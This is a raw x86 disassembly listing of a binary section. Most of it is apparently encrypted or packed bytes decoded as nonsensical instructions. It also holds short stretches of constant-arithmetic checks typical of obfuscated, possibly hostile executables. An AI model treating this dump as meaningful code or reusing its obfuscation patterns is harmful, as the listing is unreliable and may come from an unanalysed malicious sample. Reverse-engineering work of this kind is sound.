  40bbf1:	xor    DWORD PTR [edi-0x21a66a5e],eax
  40bbf7:	rcr    DWORD PTR [ebx],cl
  40bbf9:	js     0x40bc13
  40bbfb:	add    cl,BYTE PTR ds:0xf442857d
  40bc01:	jle    0x40bbe8
  40bc03:	(bad)  [edx-0x545231be]
  40bc09:	xchg   DWORD PTR [ebp-0x57],esp
  40bc0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc0d:	mov    edi,0x10ccca88
  40bc12:	mov    ah,0xf8
  40bc14:	adc    dh,BYTE PTR [eax-0x3f]
  40bc17:	mov    dl,0x62
  40bc19:	retf   
  40bc1a:	ins    DWORD PTR es:[edi],dx
  40bc1b:	push   eax
  40bc1d:	in     al,dx
  40bc1e:	pop    ebp
  40bc1f:	es mov ds:0x814f6452,al
  40bc26:	cmp    ch,dh
  40bc28:	or     DWORD PTR [ebp+0x5e],ebp
  40bc2b:	dec    edx
  40bc2c:	jecxz  0x40bbf8
  40bc2e:	mov    edi,0x62679f60
  40bc33:	and    eax,0x111daa25
  40bc38:	inc    edx
  40bc39:	push   edx
  40bc3a:	lods   al,BYTE PTR ds:[esi]
  40bc3b:	fs jnp 0x40bc67
  40bc3e:	mov    eax,0x9b51b661
  40bc43:	arpl   WORD PTR [edi-0x3b1c8b95],dx
  40bc49:	stos   BYTE PTR es:[edi],al
  40bc4a:	mov    esi,0x72d1a20a
  40bc4f:	mov    DWORD PTR [edx-0x4a645800],ebp
  40bc55:	dec    ecx
  40bc56:	int3   
  40bc57:	sub    al,0xf1
  40bc59:	loop   0x40bcd4
  40bc5b:	xchg   esp,eax
  40bc5c:	jge    0x40bccd
  40bc5e:	ret    
  40bc5f:	push   edx
  40bc60:	adc    bh,BYTE PTR [esi+0x7d]
  40bc63:	adc    ebx,DWORD PTR [eax+0x45914728]
  40bc69:	faddp  st(6),st
  40bc6b:	cmp    al,0x75
  40bc6d:	std    
  40bc6e:	aas    
  40bc6f:	in     eax,dx
  40bc70:	xchg   ebx,eax
  40bc71:	inc    edx
  40bc72:	ins    DWORD PTR es:[edi],dx
  40bc73:	dec    eax
  40bc74:	lahf   
  40bc75:	inc    ebx
  40bc76:	rcl    DWORD PTR [esi+0x37a5579e],0xfb
  40bc7d:	ds int 0x13
  40bc80:	shl    BYTE PTR [edx+0x5ae8e1c5],cl
  40bc86:	ror    eax,0xe4
  40bc89:	sbb    edx,DWORD PTR [esi-0x1f]
  40bc8c:	push   es
  40bc8d:	xchg   esi,eax
  40bc8e:	pop    edi
  40bc8f:	sbb    edi,edx
  40bc91:	dec    ecx
  40bc92:	pop    edi
  40bc93:	scas   eax,DWORD PTR es:[edi]
  40bc94:	out    0x77,eax
  40bc96:	pusha  
  40bc97:	dec    eax
  40bc98:	mov    esp,0xe443bd2d
  40bc9d:	ins    BYTE PTR es:[edi],dx
  40bc9e:	jg     0x40bcf2
  40bca0:	mov    eax,0x458c44ec
  40bca5:	dec    edi
  40bca6:	int    0xbd
  40bca8:	lock in eax,0xa6
  40bcab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcac:	mov    esi,0x5ae0d32f
  40bcb1:	jle    0x40bc39
  40bcb3:	lods   eax,DWORD PTR ds:[esi]
  40bcb4:	mov    ecx,0x36bfb950
  40bcb9:	iret   
  40bcba:	pop    ecx
  40bcbb:	sbb    ebp,DWORD PTR [eax+edx*4+0x5122a7a1]
  40bcc2:	cmp    BYTE PTR [edi-0x44],dl
  40bcc5:	std    
  40bcc6:	pop    esp
  40bcc7:	cld    
  40bcc8:	cmp    edi,DWORD PTR [edx-0x3059f2bb]
  40bcce:	adc    DWORD PTR [ebx],eax
  40bcd0:	dec    eax
  40bcd1:	fcmovnbe st,st(0)
  40bcd3:	stc    
  40bcd4:	mov    esi,0xecb09c97
  40bcd9:	or     ebp,DWORD PTR [ecx+0x794a2b32]
  40bcdf:	mov    ah,0x2
  40bce1:	xor    esp,DWORD PTR [edi]
  40bce3:	fcom   DWORD PTR [ebx+0x20]
  40bce6:	push   cs
  40bce7:	and    dl,dl
  40bce9:	jecxz  0x40bcf6
  40bceb:	in     eax,0x95
  40bced:	test   BYTE PTR [ebp+0x7a],0xe5
  40bcf1:	aad    0x87
  40bcf3:	mov    ecx,0x25f929a5
  40bcf8:	jmp    FWORD PTR [ebx-0x5e]
  40bcfb:	jbe    0x40bd31
  40bcfd:	or     ebp,DWORD PTR [ebx+0x307afea3]
  40bd03:	xlat   BYTE PTR ds:[ebx]
  40bd04:	in     al,dx
  40bd05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd06:	mov    edx,0x9608baf8
  40bd0b:	xchg   ecx,eax
  40bd0c:	enter  0x9184,0xe7
  40bd10:	stc    
  40bd11:	fld    QWORD PTR [edx-0x30043b10]
  40bd17:	mov    dl,0x8e
  40bd19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd1a:	dec    ebp
  40bd1b:	iret   
  40bd1c:	stos   DWORD PTR es:[edi],eax
  40bd1d:	rcr    BYTE PTR ds:0xa7abe584,cl
  40bd23:	mov    bh,0x34
  40bd25:	mov    ds:0x55a338df,al
  40bd2a:	jg     0x40bcb3
  40bd2c:	outs   dx,DWORD PTR ds:[esi]
  40bd2d:	es jo  0x40bcbe
  40bd30:	and    ebp,DWORD PTR [ecx+eiz*1]
  40bd33:	push   eax
  40bd34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd35:	adc    al,0x72
  40bd37:	jecxz  0x40bd02
  40bd39:	pop    esp
  40bd3a:	pop    esi
  40bd3b:	sbb    esp,edi
  40bd3d:	dec    edx
  40bd3e:	les    ebx,FWORD PTR [eax+ebp*8-0x156305b2]
  40bd45:	push   es
  40bd46:	xchg   edi,eax
  40bd47:	xchg   ebx,eax
  40bd48:	dec    ecx
  40bd49:	test   eax,0xd5b058c6
  40bd4e:	push   esi
  40bd4f:	xor    DWORD PTR ds:0x1e0f8f5c,edx
  40bd55:	xlat   BYTE PTR ds:[ebx]
  40bd56:	(bad)  
  40bd57:	ffreep st(2)
  40bd59:	lahf   
  40bd5a:	add    eax,0x8807b359
  40bd5f:	mov    ch,0xb6
  40bd61:	fistp  WORD PTR [ebx]
  40bd63:	shl    al,0x7
  40bd66:	push   eax
  40bd67:	enter  0xffb,0x8f
  40bd6b:	mov    bh,BYTE PTR [edx+0x7d]
  40bd6e:	xchg   edx,eax
  40bd6f:	dec    ebp
  40bd70:	(bad)  [edi]
  40bd72:	and    cl,BYTE PTR [ebp-0x51]
  40bd75:	or     BYTE PTR [esi],bl
  40bd77:	mov    bh,0x2d
  40bd79:	mov    ecx,0xda8ea70c
  40bd7e:	stos   DWORD PTR es:[edi],eax
  40bd7f:	retf   
  40bd80:	nop
  40bd81:	jg     0x40bdeb
  40bd83:	sahf   
  40bd84:	mov    edx,ds
  40bd86:	jne    0x40bd87
  40bd88:	inc    edi
  40bd89:	mov    eax,ds:0x1ef50846
  40bd8e:	pop    ecx
  40bd8f:	fsubr  DWORD PTR [ebx-0x38]
  40bd92:	add    al,BYTE PTR [esi]
  40bd94:	sub    eax,0xc4448cad
  40bd99:	cmp    edx,edi
  40bd9b:	jae    0x40bd65
  40bd9d:	pcmpeqb mm6,QWORD PTR [edx-0x5d]
  40bda1:	xchg   dl,cl
  40bda3:	daa    
  40bda4:	sub    eax,0x4f066df3
  40bda9:	lds    esi,FWORD PTR [eax+edx*4+0x3f]
  40bdad:	mov    esi,0x826a9f7d
  40bdb2:	dec    ecx
  40bdb4:	aaa    
  40bdb5:	fsubr  DWORD PTR [edi+0x36]
  40bdb8:	add    al,0x95
  40bdba:	idiv   BYTE PTR [edx]
  40bdbc:	jge    0x40bd84
  40bdbe:	xchg   esp,eax
  40bdbf:	mov    esp,0x96cc3904
  40bdc4:	ds icebp 
  40bdc6:	mov    ebp,0xb41941d1
  40bdcb:	or     cl,ch
  40bdcd:	shl    DWORD PTR [ebp-0x32],1
  40bdd0:	cdq    
  40bdd1:	pop    edi
  40bdd2:	and    cl,cl
  40bdd4:	enter  0x566c,0x4b
  40bdd8:	aam    0x98
  40bdda:	mov    eax,0x4bdd6bae
  40bddf:	mov    dh,0xee
  40bde1:	call   0x748d5267
  40bde6:	div    bl
  40bde8:	sbb    bl,BYTE PTR [ebp-0x5e]
  40bdeb:	sub    BYTE PTR [esi+edx*4+0x5dca429b],dh
  40bdf2:	dec    esi
  40bdf3:	cmp    eax,0x1107e636
  40bdf8:	sbb    edi,ebp
  40bdfa:	pusha  
  40bdfb:	jge    0x40be79
  40bdfd:	sub    BYTE PTR [edi],ch
  40bdff:	or     al,0xa1
  40be01:	push   esp
  40be02:	sbb    ah,BYTE PTR [esp+ebp*8+0x25]
  40be06:	push   ecx
  40be07:	sti    
  40be08:	in     al,0xc5
  40be0a:	aam    0xc4
  40be0c:	sub    DWORD PTR [edi+ecx*2+0x4e],edx
  40be10:	sbb    al,0xb9
  40be12:	xchg   edx,eax
  40be13:	fidivr DWORD PTR gs:[esi+ebx*8+0xa8a79f1]
  40be1b:	cmp    ebp,DWORD PTR [ecx]
  40be1d:	cmp    edx,ebx
  40be1f:	jmp    0xa34922e8
  40be24:	cs mov dh,0xc5
  40be27:	sahf   
  40be28:	add    al,0xe3
  40be2a:	sar    ebx,1
  40be2c:	stos   BYTE PTR es:[edi],al
  40be2d:	call   0xdb60cf58
  40be32:	and    eax,0xe5271a3a
  40be37:	arpl   WORD PTR [ebx-0x4c],ax
  40be3a:	inc    esi
  40be3b:	(bad)  
  40be3c:	and    BYTE PTR [edx-0x1eed41ae],al
  40be42:	dec    esp
  40be43:	push   ds
  40be44:	or     dl,dl
  40be46:	das    
  40be47:	xchg   ebp,eax
  40be48:	std    
  40be49:	ret    
  40be4a:	(bad)  
  40be4b:	mov    esi,0x25124d52
  40be50:	sbb    al,0xa1
  40be52:	dec    edx
  40be53:	test   esi,0xd239aeef
  40be59:	out    0x53,eax
  40be5b:	sbb    eax,0x4e33ca62
  40be60:	xor    esp,esp
  40be62:	or     eax,0xd32bb873
  40be67:	imul   esp,eax,0xffffff97
  40be6a:	inc    edx
  40be6b:	lds    eax,FWORD PTR [edx+ecx*2+0x16]
  40be6f:	rol    DWORD PTR [esi-0x30],cl
  40be72:	loope  0x40be32
  40be74:	mov    bl,0xde
  40be76:	and    BYTE PTR ds:0x7b65c04f,al
  40be7c:	aas    
  40be7d:	bound  esi,QWORD PTR [esi]
  40be7f:	jecxz  0x40be42
  40be81:	or     BYTE PTR [edi-0x7f],dh
  40be84:	mov    ah,0xed
  40be86:	lds    ebx,FWORD PTR [ebx]
  40be88:	mov    DWORD PTR [ebp-0xc],ecx
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bf19
  40bf55:	jmp    0x40bfa0
  40bf57:	push   0xffffffb6
  40bf59:	add    eax,0x126e1818
  40bf5e:	sbb    BYTE PTR [eax],bl
  40bf60:	push   cs
  40bf61:	cwde   
  40bf62:	int3   
  40bf63:	es mov al,0x1a
  40bf66:	sbb    al,0x86
  40bf68:	stos   BYTE PTR es:[edi],al
  40bf69:	jge    0x40bfc9
  40bf6b:	aam    0xec
  40bf6d:	fmul   QWORD PTR [eax-0x3d]
  40bf70:	cs mov ebp,0x42d92107
  40bf76:	mov    edi,0x34ecbff6
  40bf7b:	jecxz  0x40bf83
  40bf7d:	out    0x22,eax
  40bf7f:	mov    ds,WORD PTR [ecx+0x2074fc2d]
  40bf85:	aad    0xe3
  40bf87:	fwait
  40bf88:	cmp    DWORD PTR [esp+ecx*8+0x6],esp
  40bf8c:	out    dx,al
  40bf8d:	fnop   
  40bf8f:	jb     0x40bffc
  40bf91:	add    BYTE PTR [esi-0x49],cl
  40bf94:	inc    eax
  40bf95:	mov    eax,0x6b98ea80
  40bf9a:	push   0x31
  40bf9c:	jnp    0x40bf62
  40bf9e:	push   ecx
  40bf9f:	(bad)  
  40bfa0:	cld    
  40bfa1:	idiv   edx
  40bfa3:	je     0x40bf92
  40bfa5:	(bad)  
  40bfa6:	in     al,0xfa
  40bfa8:	xchg   esp,eax
  40bfa9:	rol    cl,0x66
  40bfac:	mov    ah,0xd1
  40bfae:	sub    esi,DWORD PTR [edi]
  40bfb0:	fisubr DWORD PTR [esi+0x58fcf881]
  40bfb6:	cld    
  40bfb7:	stos   DWORD PTR es:[edi],eax
  40bfb8:	fcomip st,st(4)
  40bfba:	pop    ecx
  40bfbb:	xchg   edx,eax
  40bfbc:	sub    DWORD PTR ds:0xa8701ca1,eax
  40bfc2:	mov    BYTE PTR [ebp+0x3764bf20],0xb3
  40bfc9:	ins    BYTE PTR es:[edi],dx
  40bfca:	jne    0x40bf6d
  40bfcc:	fst    QWORD PTR [ebx+0x6a]
  40bfcf:	data16 jae 0x40bf75
  40bfd2:	pop    ebx
  40bfd3:	mov    ?,WORD PTR [edi*2-0x1dc81fea]
  40bfda:	gs xchg ebx,eax
  40bfdc:	push   ecx
  40bfdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfde:	pop    esi
  40bfdf:	pop    ecx
  40bfe0:	xor    al,0x9c
  40bfe2:	pop    edx
  40bfe3:	fild   QWORD PTR [edx+ebp*8-0x12fbba8c]
  40bfea:	popf   
  40bfeb:	pop    esi
  40bfec:	xchg   esi,eax
  40bfed:	xor    eax,0x2a6253d8
  40bff2:	sbb    eax,0x142e0393
  40bff7:	jle    0x40bf84
  40bff9:	inc    ebx
  40bffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bffb:	aaa    
  40bffc:	adc    al,0x86
  40bffe:	mov    edx,0xe6b5e34e
  40c003:	leave  
  40c004:	outs   dx,BYTE PTR ds:[esi]
  40c005:	sub    al,0x31
  40c007:	shr    DWORD PTR [eax+0x22],1
  40c00a:	dec    eax
  40c00b:	sub    DWORD PTR [esi+0x4eb03356],ebx
  40c011:	loope  0x40c014
  40c013:	jbe    0x40bfce
  40c015:	add    BYTE PTR [edi-0x39],dl
  40c018:	sub    BYTE PTR [edi+0x37],0x30
  40c01c:	push   edi
  40c01d:	xor    bl,BYTE PTR [ebp-0x4e5118da]
  40c023:	mov    bl,0xc4
  40c025:	pop    ss
  40c026:	pop    edi
  40c027:	mov    eax,ds:0xfb033530
  40c02c:	repnz fld TBYTE PTR [esi+0x5b]
  40c030:	lods   eax,DWORD PTR ds:[esi]
  40c031:	imul   esp,DWORD PTR [ecx+eax*1],0xc20e8a7c
  40c038:	int3   
  40c039:	mov    WORD PTR ds:0xfa6470ed,gs
  40c03f:	movd   ebp,mm2
  40c042:	sbb    BYTE PTR [esi+0x6d],ah
  40c045:	and    BYTE PTR [ecx-0x3e],0x76
  40c049:	cld    
  40c04a:	lahf   
  40c04b:	test   al,0xce
  40c04d:	sti    
  40c04e:	outs   dx,DWORD PTR ds:[esi]
  40c04f:	imul   edi,DWORD PTR [edx-0x241f7cf0],0xb
  40c056:	fdivr  DWORD PTR [edi+0x15]
  40c059:	es in  al,0xdf
  40c05c:	jbe    0x40c03c
  40c05e:	aam    0xbc
  40c060:	hlt    
  40c061:	jns    0x40c0a8
  40c063:	jmp    0x2049:0xaae91495
  40c06a:	xchg   DWORD PTR [ebx],esi
  40c06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c06d:	test   ah,dl
  40c06f:	jmp    0x52f:0xb3ca
  40c075:	cmc    
  40c076:	jb     0x40bffd
  40c078:	xchg   esp,eax
  40c079:	sbb    eax,0x3bedc81
  40c07e:	leave  
  40c07f:	ror    BYTE PTR [ebx],cl
  40c081:	mov    cl,0x1
  40c083:	loopne 0x40c008
  40c085:	pop    ebp
  40c086:	and    al,0x9e
  40c088:	lock je 0x40c00b
  40c08b:	(bad)  
  40c08c:	cs push cs
  40c08e:	fs jmp 0x40c0ba
  40c091:	xor    BYTE PTR [edx+0x2e],0x8c
  40c095:	cmp    al,0x24
  40c097:	push   cs
  40c098:	and    DWORD PTR [eax],esp
  40c09a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c09b:	daa    
  40c09c:	in     eax,dx
  40c09d:	loope  0x40c02a
  40c09f:	nop
  40c0a0:	mov    ebp,0xe11c4361
  40c0a5:	or     bh,dh
  40c0a7:	fistp  QWORD PTR es:[ebx+0x45468804]
  40c0ae:	gs push edi
  40c0b0:	rol    BYTE PTR ds:[edi],1
  40c0b3:	loop   0x40c063
  40c0b5:	or     al,0x18
  40c0b7:	into   
  40c0b8:	sahf   
  40c0b9:	push   esi
  40c0ba:	jae    0x40c06b
  40c0bc:	mov    al,ds:0x11a4531a
  40c0c1:	rol    DWORD PTR [esi-0x62],0x23
  40c0c5:	dec    ecx
  40c0c6:	das    
  40c0c7:	loop   0x40c0ca
  40c0c9:	hlt    
  40c0ca:	shl    BYTE PTR [ebp-0x37],0xdc
  40c0ce:	sbb    BYTE PTR [eax+0x10713773],bl
  40c0d4:	in     al,0x0
  40c0d6:	sbb    DWORD PTR [esi+0x6c0735b4],0x3a
  40c0dd:	out    0x3d,al
  40c0df:	sub    esi,DWORD PTR [esi+0xf9962d6]
  40c0e5:	mov    cl,0xea
  40c0e7:	push   es
  40c0e8:	js     0x40c13a
  40c0ea:	outs   dx,BYTE PTR ds:[esi]
  40c0eb:	fcmovnbe st,st(5)
  40c0ed:	xor    BYTE PTR [esi+0x4abccd55],al
  40c0f3:	mov    cl,0x79
  40c0f5:	out    dx,eax
  40c0f6:	sub    DWORD PTR [edi+eax*1-0x3ee47ced],0x6d
  40c0fe:	retf   
  40c0ff:	adc    BYTE PTR [eax-0x1dcb881f],0xa3
  40c106:	pop    ecx
  40c107:	add    eax,0xcbce2bab
  40c10c:	dec    ecx
  40c10d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c10e:	mov    ecx,0xc27ea5e
  40c113:	(bad)  
  40c114:	fidiv  WORD PTR [eax-0x7400175d]
  40c11a:	adc    cl,BYTE PTR [esi]
  40c11c:	mov    bl,0x2b
  40c11e:	ret    
  40c11f:	data16 outs dx,BYTE PTR ds:[esi]
  40c121:	push   cs
  40c122:	dec    eax
  40c123:	push   ds
  40c124:	xor    bl,al
  40c126:	xchg   esp,eax
  40c127:	pushf  
  40c128:	sbb    bh,0xb1
  40c12b:	test   BYTE PTR [eax],bl
  40c12d:	ret    
  40c12e:	popa   
  40c12f:	push   eax
  40c130:	cmp    cl,dh
  40c132:	lea    esi,[ebx+0x5c]
  40c135:	sub    al,0x63
  40c137:	jne    0x40c1ac
  40c139:	jg     0x40c19d
  40c13b:	or     al,0x20
  40c13d:	adc    eax,0x8a79194c
  40c142:	fwait
  40c143:	mov    edx,0x57819834
  40c148:	mov    cl,0x14
  40c14a:	sti    
  40c14b:	fwait
  40c14c:	ins    BYTE PTR es:[edi],dx
  40c14d:	iret   
  40c14e:	sbb    esp,DWORD PTR [ebx+0x2a59da5f]
  40c154:	push   edi
  40c155:	push   ss
  40c156:	jl     0x40c179
  40c158:	push   esi
  40c159:	mov    dl,0x84
  40c15b:	scas   al,BYTE PTR es:[edi]
  40c15c:	out    0x53,eax
  40c15e:	mov    edx,0x5b4b6d74
  40c163:	xor    ax,sp
  40c166:	add    dh,cl
  40c168:	mov    al,ds:0x1b12e8e3
  40c16d:	test   DWORD PTR [edx-0x26b6672f],edx
  40c173:	jae    0x40c169
  40c175:	adc    DWORD PTR [ebp+0x500958bb],esi
  40c17b:	dec    ecx
  40c17c:	fdivr  DWORD PTR [edx+eiz*1-0x20]
  40c180:	test   DWORD PTR [edx],0xf9f25358
  40c186:	les    eax,FWORD PTR ds:0x821e84fc
  40c18c:	push   0x65ad4248
  40c191:	mov    ?,eax
  40c193:	cmp    esi,ecx
  40c195:	ret    
  40c196:	jmp    0xa380:0xd50b810a
  40c19d:	ror    DWORD PTR [esi],cl
  40c19f:	fwait
  40c1a0:	and    ecx,DWORD PTR [ecx]
  40c1a2:	mov    edi,0x46543372
  40c1a7:	rcl    BYTE PTR [eax-0x63a11449],1
  40c1ad:	sahf   
  40c1ae:	ss mov esp,0xbc049459
  40c1b4:	fstp   QWORD PTR [ecx]
  40c1b6:	xchg   edx,eax
  40c1b7:	mov    cl,0x3d
  40c1b9:	ret    
  40c1ba:	mov    al,ds:0xf434db9a
  40c1bf:	pop    edx
  40c1c0:	ds adc ah,bl
  40c1c3:	addr16 jl 0x40c185
  40c1c6:	cmp    al,0x27
  40c1c8:	push   ebp
  40c1c9:	fs pop ss
  40c1cb:	xchg   esi,eax
  40c1cc:	mov    ds:0xc7807def,al
  40c1d1:	mov    ah,0x28
  40c1d3:	dec    esp
  40c1d4:	lods   eax,DWORD PTR ds:[esi]
  40c1d5:	in     al,dx
  40c1d6:	das    
  40c1d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1d8:	(bad)  
  40c1da:	inc    esi
  40c1db:	aas    
  40c1dc:	retf   
  40c1dd:	(bad)  
  40c1de:	aas    
  40c1df:	pop    esp
  40c1e0:	xlat   BYTE PTR ds:[ebx]
  40c1e1:	call   0x6362:0xef5a9aa0
  40c1e8:	push   ebx
  40c1e9:	add    al,0xc1
  40c1eb:	mov    cl,0xfe
  40c1ed:	retf   0x5157
  40c1f0:	cs in  al,0xfb
  40c1f3:	rcr    BYTE PTR [eax+ebp*1+0x28],cl
  40c1f7:	pop    esp
  40c1f8:	popa   
  40c1f9:	xlat   BYTE PTR ds:[ebx]
  40c1fa:	(bad)  
  40c1fb:	xlat   BYTE PTR ds:[ebx]
  40c1fc:	or     eax,0x474a5521
  40c201:	mov    ds:0x60ad6dba,al
  40c206:	fsub   DWORD PTR [edx-0x54]
  40c209:	push   ebp
  40c20a:	push   0xfffffff3
  40c20c:	mov    ds:0x72acf5c2,al
  40c211:	pop    eax
  40c212:	std    
  40c213:	les    edx,FWORD PTR [esi+0x7c805a82]
  40c219:	mov    cl,0xb9
  40c21b:	jle    0x40c26b
  40c21d:	mov    WORD PTR [ebp-0x4b],es
  40c220:	std    
  40c221:	sbb    DWORD PTR [edi],eax
  40c223:	(bad)  
  40c224:	sbb    bh,dl
  40c226:	push   ebp
  40c227:	and    eax,0x2c64cb87
  40c22c:	loope  0x40c213
  40c22e:	pop    ecx
  40c22f:	dec    ecx
  40c230:	mov    ds:0xbe345f3c,al
  40c235:	fdivr  DWORD PTR [ebx]
  40c237:	loop   0x40c1e4
  40c239:	(bad)  
  40c23a:	jne    0x40c272
  40c23c:	inc    ecx
  40c23d:	outs   dx,BYTE PTR ds:[esi]
  40c23e:	fadd   st(0),st
  40c240:	pop    eax
  40c241:	dec    ebp
  40c242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c243:	pop    esi
  40c244:	lock push ds
  40c246:	enter  0x400d,0xc9
  40c24a:	xchg   ebx,eax
  40c24b:	xor    al,0x14
  40c24d:	out    0x8c,eax
  40c24f:	mov    al,ds:0x4767f02c
  40c254:	(bad)  
  40c256:	push   ebp
  40c257:	jmp    0x20dcab6b
  40c25c:	mov    WORD PTR [ecx],ss
  40c25e:	leave  
  40c25f:	psllq  mm7,QWORD PTR [ebx]
  40c262:	cs test bh,ch
  40c265:	cmc    
  40c266:	push   0x3a07d2c0
  40c26b:	imul   eax,ebx,0x49baea7c
  40c271:	inc    ecx
  40c272:	pop    esp
  40c273:	and    cl,al
  40c275:	sub    BYTE PTR [ebx+0x76],bh
  40c278:	repnz sub eax,0x710c9763
  40c27e:	jmp    0x7667111
  40c283:	int    0x5b
  40c285:	in     al,0xad
  40c287:	mov    ah,0xfa
  40c289:	lahf   
  40c28a:	dec    ebx
  40c28b:	call   0xd9bc925b
  40c290:	xchg   ecx,eax
  40c291:	xchg   ecx,eax
  40c292:	add    ch,BYTE PTR [eax-0x46]
  40c295:	in     eax,0x52
  40c297:	fadd   QWORD PTR [ebx-0x3a]
  40c29a:	or     bl,dh
  40c29c:	push   ss
  40c29d:	mov    WORD PTR ds:0xbc7e7f0d,ds
  40c2a3:	cdq    
  40c2a4:	pop    es
  40c2a5:	jg     0x40c317
  40c2a7:	nop
  40c2a8:	dec    ecx
  40c2a9:	out    0xb,eax
  40c2ab:	lock cwde 
  40c2ad:	gs aas 
  40c2af:	sahf   
  40c2b0:	inc    eax
  40c2b1:	sub    al,0x44
  40c2b3:	push   edi
  40c2b4:	mov    eax,0xd7aac5af
  40c2b9:	cmp    dh,BYTE PTR [edx+0x25]
  40c2bc:	mov    DWORD PTR [esp+ebx*4],edi
  40c2bf:	push   es
  40c2c0:	fld    QWORD PTR [edi]
  40c2c2:	xchg   DWORD PTR [edx+0x17],ebp
  40c2c5:	fcmovbe st,st(7)
  40c2c7:	mov    al,0xd7
  40c2c9:	xchg   ebx,eax
  40c2ca:	loope  0x40c2fd
  40c2cc:	shr    BYTE PTR [edx],0xb8
  40c2cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d0:	push   ebp
  40c2d1:	mov    DWORD PTR [edx-0x3a],esi
  40c2d4:	or     DWORD PTR [eax+0x1f371978],edx
  40c2da:	clc    
  40c2db:	inc    ebx
  40c2dc:	jge    0x40c2b6
  40c2de:	sbb    BYTE PTR [ecx-0xd],dl
  40c2e1:	sbb    ebx,DWORD PTR [edi+0x57]
  40c2e4:	pop    eax
  40c2e5:	push   esi
  40c2e6:	jno    0x40c349
  40c2e8:	loop   0x40c292
  40c2ea:	addr16 (bad) 
  40c2ec:	sahf   
  40c2ed:	cli    
  40c2ee:	push   ebx
  40c2ef:	jo     0x40c32b
  40c2f1:	aam    0xc0
  40c2f3:	jge    0x40c2d5
  40c2f5:	loope  0x40c2f8
  40c2f7:	aas    
  40c2f8:	fdivr  st,st(2)
  40c2fa:	push   esp
  40c2fb:	and    BYTE PTR [esi+eax*1-0x5377e159],ah
  40c302:	add    al,BYTE PTR [esp+ebx*4]
  40c305:	repnz fs leave 
  40c308:	inc    ebp
  40c309:	xor    ch,BYTE PTR [eax+0x71e31b06]
  40c30f:	and    edx,DWORD PTR [edx+0x65]
  40c312:	jmp    0x102c55c3
  40c317:	jl     0x40c316
  40c319:	inc    edi
  40c31a:	hlt    
  40c31b:	cli    
  40c31c:	xor    esi,edx
  40c31e:	inc    ebp
  40c31f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c321:	popf   
  40c322:	and    BYTE PTR [edi],dl
  40c324:	fcom   QWORD PTR [ebp-0x6a]
  40c327:	loope  0x40c392
  40c329:	(bad)  
  40c32a:	and    cl,ch
  40c32c:	lds    esi,FWORD PTR [ecx]
  40c32e:	adc    BYTE PTR [eax+0x6065bd08],dl
  40c334:	loope  0x40c368
  40c336:	ins    BYTE PTR es:[edi],dx
  40c337:	adc    BYTE PTR ds:0xa8e1e850,dh
  40c33d:	add    BYTE PTR [eax],al
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42275c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422548
